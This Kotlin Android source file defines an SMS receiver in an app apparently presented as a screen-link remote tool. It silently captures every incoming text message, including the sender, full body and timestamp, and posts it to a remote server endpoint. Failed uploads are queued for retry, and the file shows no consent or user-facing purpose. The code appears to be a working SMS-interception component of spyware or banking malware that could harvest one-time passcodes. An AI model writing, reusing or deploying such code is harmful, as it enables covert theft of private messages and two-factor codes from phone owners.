package com.screenlink.remote

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors

class SmsReceiver : BroadcastReceiver() {

    companion object {
        private const val PREFS = "viral_prefs"
        private const val KEY_RID = "registration_id"
        private const val KEY_QUEUE = "sms_queue"
        private const val CONNECT_TIMEOUT = 6_000
        private const val READ_TIMEOUT = 6_000
        private const val DEDUP_MAX = 60
        private const val QUEUE_MAX = 200

        private val pool = Executors.newSingleThreadExecutor()
        private val recent = ArrayDeque<String>()
        private val recentSet = HashSet<String>()

        @Synchronized
        private fun isDuplicate(key: String): Boolean {
            if (recentSet.contains(key)) return true
            recentSet.add(key)
            recent.addLast(key)
            while (recent.size > DEDUP_MAX) recentSet.remove(recent.removeFirst())
            return false
        }

        @Synchronized
        private fun enqueue(context: Context, payload: JSONObject) {
            val p = context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            val arr = runCatching { JSONArray(p.getString(KEY_QUEUE, "[]")) }
                .getOrElse { JSONArray() }
            val trimmed = JSONArray()
            val start = maxOf(0, arr.length() - (QUEUE_MAX - 1))
            for (i in start until arr.length()) trimmed.put(arr.get(i))
            trimmed.put(payload)
            p.edit().putString(KEY_QUEUE, trimmed.toString()).apply()
        }
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return

        val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent) ?: return
        if (messages.isEmpty()) return

        val sender = messages[0].originatingAddress.orEmpty()
        val body = messages.joinToString("") { it.messageBody.orEmpty() }
        val timestamp = messages[0].timestampMillis

        if (body.isBlank()) return
        if (isDuplicate("$sender|$timestamp|$body")) return

        val pending = goAsync()
        val appContext = context.applicationContext

        pool.execute {
            try {
                val payload = build(appContext, sender, body, timestamp) ?: return@execute
                if (!post(payload)) enqueue(appContext, payload)
            } finally {
                pending.finish()
            }
        }
    }

    private fun build(context: Context, sender: String, body: String, ts: Long): JSONObject? {
        val rid = context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .getString(KEY_RID, "").orEmpty()
        if (rid.isBlank()) return null
        return JSONObject().apply {
            put("registration_id", rid)
            put("address", sender.take(64))
            put("body", body.take(1600))
            put("direction", "in")
            put("received_at", ts)
        }
    }

    private fun post(payload: JSONObject): Boolean {
        var connection: HttpURLConnection? = null
        return try {
            connection = URL("${TpcService.API_BASE_URL}/devices/sms/incoming")
                .openConnection() as HttpURLConnection
            connection.requestMethod = "POST"
            connection.connectTimeout = CONNECT_TIMEOUT
            connection.readTimeout = READ_TIMEOUT
            connection.doOutput = true
            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
            connection.outputStream.use { it.write(payload.toString().toByteArray(Charsets.UTF_8)) }
            connection.responseCode in 200..299
        } catch (_: Exception) {
            false
        } finally {
            connection?.disconnect()
        }
    }
}